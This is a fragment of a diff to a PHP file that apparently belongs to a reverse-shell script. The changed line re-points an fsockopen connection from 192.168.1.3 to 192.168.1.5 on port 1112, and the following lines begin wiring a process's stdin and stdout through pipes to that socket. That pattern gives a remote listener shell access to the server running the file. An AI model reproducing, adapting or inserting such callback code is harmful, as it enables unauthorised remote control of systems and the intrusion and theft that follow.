@@ -189,7 +189,7 @@
 				
 				chdir("/");
 
-				$sock = fsockopen("192.168.1.3",1112);
+				$sock = fsockopen("192.168.1.5",1112);
 			 	$descriptorspec = array(
 			        0 => array("pipe", "r"),	// stdin
 			        1 => array("pipe", "w"),	// stdout
